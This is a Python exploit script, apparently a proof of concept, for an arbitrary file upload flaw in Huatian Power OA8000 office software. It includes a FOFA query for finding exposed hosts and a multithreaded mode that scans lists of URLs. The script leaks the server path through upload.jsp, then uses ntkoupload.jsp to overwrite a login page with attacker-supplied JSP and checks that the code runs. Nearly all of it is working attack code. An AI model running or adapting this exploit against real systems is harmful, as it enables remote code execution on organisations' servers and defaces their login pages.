#FOFA: app=“华天动力-OA8000”

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '华天动力 OA 任意文件上传漏洞',
        'vulnerable': False,
        'url': target
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/OAapp/jsp/upload.jsp'
    payload2 = '/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm',
    }
    vurl = urllib.parse.urljoin(target, payload)
    vurl2 = urllib.parse.urljoin(target, payload2)
    data = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="file"; filename="xxx.xml"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="filename"\r\n\r\nxxx.png\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
    data2 = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"\r\nContent-Type: image/png\r\n\r\n{0}\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="newFileName"\r\n\r\n{1}Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
    verify_url = urllib.parse.urljoin(target, '/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp')
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('.+\.dat', rep.text):
            path = re.findall('(.*?)Tomcat/webapps/.*?\.dat', rep.text)
            if len(path) != 0:
                path = path[0]
            else:
                path = re.findall('(.*?)htoadata/appdata/.*?\.dat', rep.text)[0]
            data2 = data2.format(shell, path)
            rep2 = requests.post(vurl2, headers=headers, timeout=timeout, data=data2, verify=False)
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},verify=False)
            if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
                print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("华天动力 OA 任意文件上传漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()